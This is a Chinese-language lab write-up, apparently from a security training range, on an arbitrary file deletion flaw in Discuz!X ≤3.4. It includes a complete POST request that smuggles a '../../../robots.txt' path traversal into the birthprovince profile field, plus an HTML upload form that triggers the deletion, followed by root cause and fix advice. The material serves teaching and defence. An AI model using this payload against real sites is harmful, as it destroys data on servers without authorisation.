# Discuz!X ≤3.4 任意文件删除漏洞

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞名称** | Discuz!X ≤3.4 任意文件删除漏洞 |
| **影响组件** | Discuz! X ≤3.4 |
| **漏洞类型** | 任意文件删除 |
| **危险等级** | 🟠 中危 |
| **默认端口** | 8080 |

## 漏洞描述

Discuz!X ≤3.4 版本中存在任意文件删除漏洞。攻击者可以通过精心构造的个人资料修改请求，将文件路径写入数据库，然后在头像上传时触发文件删除操作，实现删除服务器上的任意文件。

## 漏洞复现

### 环境信息

- 靶机 IP：192.168.2.47
- Web 端口：8080

### 操作步骤

**1. 安装 Discuz**

安装时，只用修改数据库地址为 `db`，其他保持 `默认` 即可：

![安装页面](https://static.nextcyber.cn/attachments/images/course/task/bc4c406ed04c4ee4826f45b2171a453c.png)

**2. 验证 robots.txt 存在**

访问 `http://192.168.2.47/robots.txt` 可见 `robots.txt` 是存在的：

![robots.txt存在](https://static.nextcyber.cn/attachments/images/course/task/f07c270349d844f9b6316db5a7b0963b.png)

**3. 获取 formhash**

注册用户后，在个人设置页面找到自己的 `formhash`：

![获取formhash](https://static.nextcyber.cn/attachments/images/course/task/530f33d14e4a459985d657dd9ee7f6b1.png)

**4. 发送恶意请求**

带上自己的 `Cookie`、`formhash` 发送如下数据包：

```
POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
Host: localhost
Content-Length: 367
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: [your cookie]
Connection: close

------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="formhash"

[your formhash]
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="birthprovince"

../../../robots.txt
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="profilesubmit"

1
------WebKitFormBoundaryPFvXyxL45f34L12s--
```

![发送请求](https://static.nextcyber.cn/attachments/images/course/task/d0f5dc6c25684d1eb2e09bc1e9a0fb24.png)

提交成功之后，用户资料修改页面上的 `出生地` 就会显示成下图所示的状态：

![脏数据](https://static.nextcyber.cn/attachments/images/course/task/6f71e1428c274bf3b3b098b3901a071c.png)

说明我们的 `脏数据` 已经进入数据库了。

**5. 创建上传页面**

然后，新建一个 `upload.html`，代码如下，将其中的 `your-ip` 改成 discuz 的域名，`form-hash` 改成你的 formhash：

```html
<body>
    <form action="http://[your-ip]/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]" method="post" enctype="multipart/form-data">
        <input type="file" name="birthprovince" />
        <input type="submit" value="upload" />
    </form>
</body>
```

用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。

**6. 验证文件被删除**

再次访问 `http://192.168.2.47/robots.txt`，发现文件成功被删除。

## 漏洞原理

Discuz!X 在处理用户个人资料时，将用户输入的 `birthprovince` 字段直接存入数据库。当用户上传头像时，程序会从数据库中读取这个字段值，并将其作为文件路径进行处理。由于缺乏充分的路径遍历检查，攻击者可以通过 `../../../robots.txt` 这样的路径穿越序列删除服务器上的任意文件。

## 修复建议

1. 升级到 Discuz!X 最新版本
2. 对用户输入的路径进行严格的验证和过滤
3. 限制可删除文件的范围
4. 使用白名单机制限制可操作的文件


---

## 靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/60) 在线实战演练此漏洞。
